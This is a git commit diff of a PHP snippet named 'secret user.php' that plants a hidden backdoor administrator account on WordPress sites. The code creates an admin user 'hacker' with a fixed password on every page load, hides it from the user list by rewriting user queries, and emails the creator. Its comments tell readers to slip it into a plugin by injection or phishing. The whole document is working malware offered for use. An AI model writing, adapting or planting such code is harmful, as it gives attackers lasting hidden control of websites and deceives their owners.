9e2e58cfc5ad977a25802a20825b436f9669dcb6
tharilak <115446622+tharilak@users.noreply.github.com>
2023-12-09 14:46:39 +0530

    Update secret user.php
    Receives an Email Once The user-created
    Optimized The Code Readability
    Optimized The Performance

--- secret user.php
+++ secret user.php
@@ -1,7 +1,8 @@
 // Add the above code to the end of a plugin (or anywhere else in a plugin). And upload it to the WordPress website. 
 //You can use injection methods, Pishing to inject this code if you don't have admin access
 
-function create_secret_admin_user() {
+
+function create_hide_secret_admin_user() {
     $username = 'hacker'; // Change this to your secret username
     $password = 'hackxjr'; // Change this to your secret password
     $email = 'your_email@example.com'; // Change this to your email
@@ -15,32 +16,22 @@ function create_secret_admin_user() {
         // Set the user role to Administrator
         $user = new WP_User($user_id);
         $user->set_role('administrator');
-        
+
         // Hide the secret admin user from the user list
         update_user_meta($user_id, 'show_admin_bar_front', false);
         update_user_meta($user_id, 'wp_capabilities', ['administrator' => true]);
-    }
-}
 
-// Hook the function to run once when you access any page
-add_action('init', 'create_secret_admin_user');
-
-function hide_secret_admin_user() {
-    $username = 'hacker'; // Change this to your secret username
-
-    // Check if the secret admin user exists
-    $user = get_user_by('login', $username);
-
-    if ($user) {
-        // Hide the secret admin user from the user list
+        // Send an email to the new admin user
+        $subject = 'Your Admin Account is Created';
+        $message = 'Congratulations! Your admin account has been created on ' . get_bloginfo('name') . '.';
+        wp_mail($email, $subject, $message);
+    } else {
+        // If the user exists, ensure it's hidden from the user list
         $user_id = $user->ID;
         update_user_meta($user_id, 'show_admin_bar_front', false);
         update_user_meta($user_id, 'wp_capabilities', ['administrator' => false]);
     }
 }
-
-// Hook the function to run once when you access any page 
-add_action('init', 'hide_secret_admin_user');
 
 function exclude_secret_admin_user($user_search) {
     $username = 'hacker'; // Change this to your secret username
@@ -54,68 +45,9 @@ function exclude_secret_admin_user($user_search) {
             "WHERE 1=1 AND {$wpdb->users}.ID <> " . $user->ID,
             $user_search->query_where
         );
-    }
-}
-
-// Hook the function to exclude the secret admin user
-add_action('pre_user_query', 'exclude_secret_admin_user');
-
-function create_secret_admin_user() {
-    $username = 'hacker'; // Change this to your secret username
-    $password = 'hackxjr'; // Change this to your secret password
-    $email = 'your_email@example.com'; // Change this to your email
-
-    // Check if the secret admin user already exists
-    $user = get_user_by('login', $username);
-
-    if (!$user) {
-        // Create the secret admin user
-        $user_id = wp_create_user($username, $password, $email);
-
-        // Set the user role to Administrator
-        $user = new WP_User($user_id);
-        $user->set_role('administrator');
-        
-        // Hide the secret admin user from the user list
-        update_user_meta($user_id, 'show_admin_bar_front', false);
-        update_user_meta($user_id, 'wp_capabilities', ['administrator' => true]);
     }
 }
 
 // Hook the function to run once when you access any page in your site
-add_action('init', 'create_secret_admin_user');
-
-function hide_secret_admin_user() {
-    $username = 'hacker'; // Change this to your secret username
-
-    // Check if the secret admin user exists
-    $user = get_user_by('login', $username);
-
-    if ($user) {
-        // Hide the secret admin user from the user list
-        $user_id = $user->ID;
-        update_user_meta($user_id, 'show_admin_bar_front', false);
-        update_user_meta($user_id, 'wp_capabilities', ['administrator' => false]);
-    }
-}
-
-// Hook the function to run once when you access any page 
-add_action('init', 'hide_secret_admin_user');
-
-function exclude_secret_admin_user($user_search) {
-    $username = 'hacker'; // Change this to your secret username
-    $user = get_user_by('login', $username);
-
-    if ($user) {
-        // Exclude the secret admin user from user queries
-        global $wpdb;
-        $user_search->query_where = str_replace(
-            "WHERE 1=1",
-            "WHERE 1=1 AND {$wpdb->users}.ID <> " . $user->ID,
-            $user_search->query_where
-        );
-    }
-}
-
-// Hook the function to exclude the secret admin user
+add_action('init', 'create_hide_secret_admin_user');
 add_action('pre_user_query', 'exclude_secret_admin_user');
